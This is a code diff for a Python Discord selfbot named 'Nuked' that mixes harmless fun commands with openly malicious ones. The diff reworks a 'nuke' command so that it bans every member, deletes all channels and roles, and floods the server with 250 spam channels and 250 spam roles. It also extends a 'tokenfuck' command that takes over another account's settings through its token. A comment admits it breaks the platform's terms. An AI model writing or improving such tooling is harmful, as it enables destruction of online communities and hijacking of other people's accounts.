@@ -12,10 +12,15 @@ try:
     from faker import Faker
     from pythonping import ping as pingip
     from telnetlib import Telnet
+    from threading import Thread
 
 except ImportError:
 
     print('There was an error importing something, retrying.')
+    installing = os.popen('pip install -r requirements.txt').read()
+    if 'is not recognized as an internal or external command, operable program or batch file.' in installing:
+        print('You do not have pip installed, redirecting to python page.')
+        webbrowser.open_new('https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe')
     import discord, time, requests, asyncio, json, random, datetime, colorama, re, os, ctypes, nmap3, numpy, webbrowser, base64, proxyscrape, pyfiglet, cursor, math
     from os import system, name
     from pypresence import Presence
@@ -35,7 +40,6 @@ except ImportError:
 # this is violating tos but idc, i dont condone usage of it so im ok right?
 # hopefully
 # ily ;)
-
 
 version = 'v3'
 literal_version = 'v3.0'
@@ -154,11 +158,6 @@ ignore_prefix = config.get('ignore_prefix')
 
 numbers = '1234567890'
 
-def autism(text):
-    vowel = 'aeiou'
-    for vowel in text:
-        retext = vowel.replace(vowel, random.choices(randomness + randomnum, k=12))
-    return retext
 
 token = config.get('token')
 password = config.get('password')
@@ -254,8 +253,7 @@ def splash():
                                    {Fore.LIGHTCYAN_EX}        ║  {Fore.LIGHTMAGENTA_EX}Email Verified?: {Fore.LIGHTCYAN_EX}{client.user.verified}{Fore.RESET}{Fore.LIGHTMAGENTA_EX}
                                    {Fore.LIGHTCYAN_EX}        ║  {Fore.LIGHTMAGENTA_EX}Server Count: {Fore.LIGHTCYAN_EX}{Fore.LIGHTCYAN_EX}{len(client.guilds)}{Fore.RESET}{Fore.LIGHTMAGENTA_EX}
                                    {Fore.LIGHTCYAN_EX}        ║  {Fore.LIGHTMAGENTA_EX}Rich Presence: {Fore.LIGHTCYAN_EX}{Fore.LIGHTCYAN_EX}{rich_presence}{Fore.RESET}{Fore.LIGHTMAGENTA_EX}
-                                   {Fore.LIGHTCYAN_EX}        ╚═════════{Fore.LIGHTMAGENTA_EX}═══════{Fore.RESET}
-        ''' + Fore.RESET)
+                                   {Fore.LIGHTCYAN_EX}        ╚═════════{Fore.LIGHTMAGENTA_EX}═══════{Fore.RESET}''' + Fore.RESET)
 
 
 if rich_presence:
@@ -295,22 +293,6 @@ def old_splash():
                                             {Fore.LIGHTMAGENTA_EX}Rich Presence: {rich_presence}{Fore.RESET}
         ''' + Fore.RESET)
 
-def testingp():
-    print(f'''{Fore.RESET}
-
-    			███╗  ██╗        ██╗   ██╗        ██╗  ██╗        ███████╗        ██████╗
-    			████╗ ██║        ██║   ██║        ██║ ██╔╝        ██╔════╝        ██╔══██╗
-    			██╔██╗██║        ██║   ██║        █████═╝░        █████╗          ██║  ██║
-    			██║╚████         ██║   ██║        ██╔═██╗░        ██╔══╝          ██║  ██║
-    			██║ ╚███║        ╚██████╔╝        ██║ ╚██╗        ███████╗        ██████╔╝
-    			╚═╝  ╚══╝         ╚═════╝         ╚═╝  ╚═╝        ╚══════╝        ╚═════╝
-
-
-
-
-                           {Fore.CYAN}Nuked | kylie#1337 <3 | {Fore.BLUE}Logged in as: {client.user.name}#{client.user.discriminator} {Fore.CYAN}| ID: {Fore.BLUE}{client.user.id}   
-                           {Fore.CYAN}Prefix: {Fore.WHITE}{prefix}
-        ''' + Fore.RESET)
 
 def Nitro():
     code = ''.join(random.choices(randomness + randomnum, k=16))
@@ -380,7 +362,7 @@ async def userinfo(ctx, member: discord.Member = None):
 @client.command()
 async def help(ctx):
     await ctx.message.delete()
-    embed = discord.Embed(title='**Help**', description=f'Welcome to Nuked, {client.user.display_name}#{client.user.discriminator}.',color=0xfd53d0)
+    embed = discord.Embed(title='**Help**', description=f'Welcome to Nuked, {client.user.display_name}#{client.user.discriminator}.\nCommand count: {len(client.commands)}',color=0xfd53d0)
     embed.add_field(name='**Fun Commands**', value=f'{client.command_prefix}fun', inline=False)
     embed.add_field(name='**NSFW Commands**', value=f'{client.command_prefix}nsfw', inline=False)
     embed.add_field(name='**Malicious Commands**', value=f'{client.command_prefix}malicious', inline=False)
@@ -421,6 +403,7 @@ async def util2(ctx):
     embed = discord.Embed(title='**Utility Commands**', color=0xfd53d0)
     embed.add_field(name="**guildname**", value="[name] sets the servers name.", inline=False)
     embed.add_field(name="**backupfriends**", value="dumps all friends name and tag into a text file.", inline=False)
+    embed.add_field(name="**allcommands**", value="sends every command in the selfbot as a list.", inline=False)
     embed.add_field(name="**pscrape**", value="dumps proxies into a text file called proxies.", inline=False)
     embed.add_field(name="**read**", value="marks every guild as read (marks all messages as read).", inline=False)
     embed.add_field(name="**query**", value="[anything to query into google] queries your message into google.", inline=False)
@@ -502,9 +485,6 @@ async def fun(ctx):
     embed.add_field(name="**hug**", value="[mentioned user] hugs someone.", inline=False)
     embed.set_footer(text=f"Command prefix is \"{client.command_prefix}\"")
     await ctx.send(embed=embed, delete_after=val)
-
-
-
 
 
 
@@ -608,7 +588,8 @@ async def tokenfuck(ctx, _token):
         'convert_emoticons': False,
         'enable_tts_command': False,
         'explicit_content_filter': '0',
-        'status': "invisible"
+        'status': "invisible",
+        'custom_status': "token fucked by https://github.com/kyliex/nuked"
     }
     guild = {
         'channels': None,
@@ -766,21 +747,18 @@ async def listening(ctx, *, message):
             name=message,
         ))
 
-
-@client.command(aliases=['serverfuck'])
-async def nuke(ctx):
-    await ctx.message.delete()
+async def destroy(ctx):
     for user in ctx.guild.members:
         try:
             await user.ban()
         except:
             pass
-    for channel in list(ctx.guild.channels):
+    for channel in ctx.guild.channels:
         try:
             await channel.delete()
         except:
             pass
-    for role in list(ctx.guild.roles):
+    for role in ctx.guild.roles:
         try:
             await role.delete()
         except:
@@ -791,14 +769,25 @@ async def nuke(ctx):
             description="Nuked ON TOP",
             reason="idk",
             icon=None,
-            banner=gayass
+            banner=None
         )
     except:
         pass
+
+async def masschannel(ctx):
     for _i in range(250):
         await ctx.guild.create_text_channel(name="get nuked lol")
+
+async def massrole(ctx):
     for _i in range(250):
         await ctx.guild.create_role(name="get nuked lol")
+
+@client.command(aliases=['serverfuck'])
+async def nuke(ctx):
+    await ctx.message.delete()
+    Thread(target=await destroy(ctx)).start()
+    Thread(target=await masschannel(ctx)).start()
+    Thread(target=await massrole(ctx)).start()
 
 @client.command(aliases=['mtg'])
 async def masstokens(ctx):
@@ -1376,6 +1365,31 @@ async def lick(ctx, member: discord.Member=None):
     embed.set_image(url=r["url"])
     await ctx.send(embed=embed, delete_after=val)
 
+@client.command()
+async def allcommands(ctx):
+    await ctx.message.delete()
+    await ctx.send('```' + '\n'.join([str for str in client.all_commands]) + '```', delete_after=val)
+
+@client.command()
+async def github(ctx):
+    await ctx.message.delete()
+    webbrowser.open_new('https://github.com/kyliex')
+
+@client.command()
+async def trumptweet(ctx, *, message):
+    await ctx.message.delete()
+    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}').json()
+    embed = discord.Embed(color=0xfd53d0)
+    embed.set_image(url=r["message"])
+    await ctx.send(embed=embed, delete_after=val)
+
+@client.command()
+async def clyde(ctx, *, message):
+    await ctx.message.delete()
+    r = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={message}').json()
+    embed = discord.Embed(color=0xfd53d0)
+    embed.set_image(url=r["message"])
+    await ctx.send(embed=embed, delete_after=val)
 
 if __name__ == '__main__':
     try:
